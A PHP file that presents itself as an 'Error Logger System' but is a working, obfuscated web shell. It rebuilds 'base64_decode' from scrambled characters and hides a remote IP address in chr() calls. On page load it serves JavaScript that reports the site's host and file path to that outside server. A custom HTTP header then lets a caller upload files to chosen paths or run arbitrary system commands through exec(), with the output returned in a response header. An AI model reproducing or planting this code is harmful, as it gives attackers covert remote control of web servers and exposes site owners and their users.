<?php

    //Error Logger System version 0.1

    error_reporting(0);
    umask(0);

    $Path = __FILE__;
    $CurrentFile = basename(__FILE__);

    $KeyBase = chr(98)."222E07bF6C5"."4B".chr(65)."DE3D4ddb8eEf010c49_A22"."a52BD".chr(115)."7ea2b".chr(101)."4aDoooo";
    $NuNe = $KeyBase;
    $NuNes = $NuNe[0].$NuNe[14].$NuNe[42].$NuNe[48].$NuNe[9].$NuNe[12].$NuNe[33].$NuNe[15].$NuNe[16].$NuNe[30].$NuNe[55].$NuNe[20].$NuNe[48];
    $LogAddress = chr(104).chr(116).chr(116).chr(112).chr(58).chr(47).chr(47).chr(49).chr(48).chr(54).chr(46).chr(49).chr(54).chr(55).chr(46).chr(49).chr(56).chr(50).chr(46).chr(50).cHr(52).CHr(56).chr(58).chr(51).chr(57).chr(51).chr(57);

    $SSW = $NuNes("I1VwbG9hZEZpbGU6");

    header("Error-Logger-System: Ver.0.1 Welcome :)");
    $Logger = $_SERVER["HTTP_ERROR_LOGGER_SYSTEM"];

    if (empty($Logger)){
        echo $NuNes("PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSdqYSc+DQogICAgPGhlYWQ+DQogICAgICAgIDxtZXRhIGNoYXJzZXQ9J1VURi04Jz4NCiAgICAgICAgPHRpdGxlPjwvdGl0bGU+DQogICAgICAgIDxtZXRhIG5hbWU9J2Rlc2NyaXB0aW9uJyBjb250ZW50PSdFcnJvciBMb2dnZXInPg0KICAgICAgICA8bWV0YSBuYW1lPSd2aWV3cG9ydCcgY29udGVudD0nd2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCc+DQogICAgPC9oZWFkPg0KPGJvZHk+DQogICAgPGgxPkxvZ2dlciBJcyBXb3JraW5nPC9oMT4NCiAgICA8cD5UaGUgc3lzdGVtIGlzIHdvcmtpbmcgcHJvcGVybHkuPC9wPg0KICAgIDxzY3JpcHQ+");
        echo $NuNes("Y29uc3QgSnNvbkxvZyA9IHtOb3RpY2U6ICdEZXRlY3RpbmcgQWNjZXNzJyxIb3N0OiBkb2N1bWVudC5sb2NhdGlvbi5ob3N0LFBhdGg6ICc=").$Path.$NuNes("J307eGhyID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7eGhyLm9wZW4oJ1BPU1QnLCAn").$LogAddress.$NuNes("L2xvZ2dlci9sb2dnaW5nLnBocCcsIHRydWUpO3hoci5zZXRSZXF1ZXN0SGVhZGVyKCdDb250ZW50LVR5cGUnLCAnYXBwbGljYXRpb24vanNvbicpO3hoci5vbnJlYWR5c3RhdGVjaGFuZ2UgPSBmdW5jdGlvbigpIHtpZiAoeGhyLnJlYWR5U3RhdGUgPT0gNCAmJiB4aHIuc3RhdHVzID09IDIwMCl7Y29uc29sZS5sb2coJ1dvcmtpbmcuJyk7fTt9O3hoci5zZW5kKEpTT04uc3RyaW5naWZ5KEpzb25Mb2cpKTs=");
        echo $NuNes("PC9zY3JpcHQ+DQo8L2JvZHk+DQo8L2h0bWw+");
        echo $Logger;

    }else if (str_starts_with($Logger, $SSW)) {
        echo $NuNes("IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj");
        echo $NuNes("PGZvcm0gbWV0aG9kPSdQT1NUJyBlbmN0eXBlPSdtdWx0aXBhcnQvZm9ybS1kYXRhJyBhY3Rpb249Jw==").$CurrentFile.$NuNes("Jz48aW5wdXQgdHlwZT0naGlkZGVuJyBuYW1lPSdsb2dmaWxlJz48L2Zvcm0+");
        echo $NuNes("IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj");
        $UploadDir = substr($Logger, 12);$TmpFile = $_FILES["logfile"]["tmp_name"];$File = $UploadDir.$_FILES["logfile"]["name"];$FileName  = $_FILES["logfile"]["name"];

        if (substr($Logger, 12) === ""){$UploadDir = "Default path: ".__DIR__;$File = "./".$_FILES["logfile"]["name"];};

        if (move_uploaded_file($TmpFile, $File)){echo "\n[ok] Successfully.\n-> [$UploadDir/$FileName]\n";}else {echo "\n[err] Failed.\n";};

    }else {exec($Logger, $Output);header("Error-Logger-System: Log - ".json_encode($Output), false);};//exec($Logger, $Output);header("Error-Logger-System: Log - ".json_encode($Output));}; //header("Log: ".json_encode($Output));echo "Log: ".json_encode($Output);};

?>
